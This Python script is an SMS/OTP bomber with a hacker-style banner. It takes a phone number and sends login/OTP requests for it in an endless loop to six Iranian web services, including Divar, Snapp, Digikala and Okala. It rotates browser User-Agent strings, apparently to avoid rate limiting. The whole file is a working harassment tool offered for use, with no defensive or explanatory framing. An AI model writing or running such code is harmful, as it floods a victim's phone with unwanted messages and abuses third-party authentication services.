import requests
import random
import time

import colorama
from colorama import Fore , Back ,Style
colorama.init()

x=("--------------------------------------")
a=("__   __    _  __     _____            ")
b=("\ \ / /_ _| |/ /   _|__  /__ _        ")
c=("\ \ / /_ _| |/ /   _|__  /__ _        ")
d=("  | | (_| | . \ |_| |/ /| (_| |       ")
e=("  |_|\__,_|_|\_\__,_/____\__,_|       ")
h=("                                      ")
z=("--------------------------------------")
y=("Created By EhSaNYaKuZa                ")
y1=("           Ver.1.3                    ")

print (Style.BRIGHT+Back.BLACK + Fore.RED + x)
print (Fore.LIGHTBLUE_EX +a)
print (b)
print (c)
print (d)
print (e)
print (h)
print (Fore.RED + z)
print (Fore.CYAN + y)
print (Fore.CYAN + y1)
print (Fore.RED + z)

number = input(Fore.LIGHTMAGENTA_EX + "Enter Your Phone Number (Without 0) :")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":"0" + number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone" :"+98" + number}

url_snappf = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=ffc19728-db7a-4874-8cab-b894e9a0b1c3&locale=fa"
json_snappf ={"cellphone" : "+98" + number}

url_Sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor = {"username" : "0" + number}

url_digikala = "https://api.digikala.com/v1/user/authenticate/"
json_digikala ={"username": "0" +  number}

url_okala = "https://api-react.okala.com/C/CustomerAccount/OTPRegister"
json_okala = {"mobile" : "0" + number}
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv76.0) Gecko/20100101 Firefox/76.0', 
        'Accept': '*/*'
    },
        {
        "User-Agent": "Mozilla/5.0 (X11;Ubuntu; Linux x86_64; rv72.0) Gecko/20100101 Firefox/72.0", 
        'Accept': '*/*'
    },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv72.0) Gecko/20100101 Firefox/72.0", 
        'Accept': '*/*'
    },
        {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv76.0) Gecko/20100101 Firefox/69.0', 
        'Accept': '*/*'
    },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv72.0) Gecko/20100101 Firefox/76.0", 
        'Accept': '*/*'
    },
        {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
        'Accept': '*/*'
    },
]

while True:

    random_head = random.choice(heads)

    req = requests.post(url=url_divar , json=json_divar , headers=random_head)
    print(req)

    req1 = requests.post(url=url_snapp , json=json_snapp , headers=random_head)
    print(req1)

    req2 = requests.post(url=url_snappf , json=json_snappf , headers=random_head)
    print(req2)

    req3 = requests.post(url=url_Sheypoor, json=json_sheypoor , headers=random_head)
    print(req3)

    req4 = requests.post(url=url_digikala , json=json_digikala , headers=random_head)
    print(req4)

    req5 = requests.post(url=url_okala , json=json_okala , headers=random_head)
    print(req5)
time.sleep(5)